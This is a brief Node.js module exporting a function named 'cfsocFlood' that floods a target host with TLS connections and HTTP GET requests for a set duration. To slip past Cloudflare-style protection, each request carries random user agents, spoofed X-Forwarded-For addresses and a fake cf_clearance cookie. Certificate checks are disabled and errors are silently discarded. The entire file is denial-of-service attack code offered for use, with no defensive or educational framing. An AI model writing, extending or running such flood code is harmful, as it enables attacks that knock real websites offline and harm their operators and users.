const tls = require('tls');

function cfsocFlood(host, port, duration) {
  const end = Date.now() + duration*1000;
  while(Date.now() < end){
    const socket = tls.connect({host, port, servername: host, rejectUnauthorized: false}, ()=>{
      const req = 
        `GET / HTTP/1.1\r\n`+
        `Host: ${host}\r\n`+
        `User-Agent: ${global.randUA()}\r\n`+
        `Cookie: cf_clearance=randomclearance\r\n`+
        `X-Forwarded-For: ${global.randIP()}\r\n`+
        `Connection: close\r\n\r\n`;
      socket.write(req);
      socket.end();
    });
    socket.on('error',()=>{});
  }
}
module.exports = { cfsocFlood };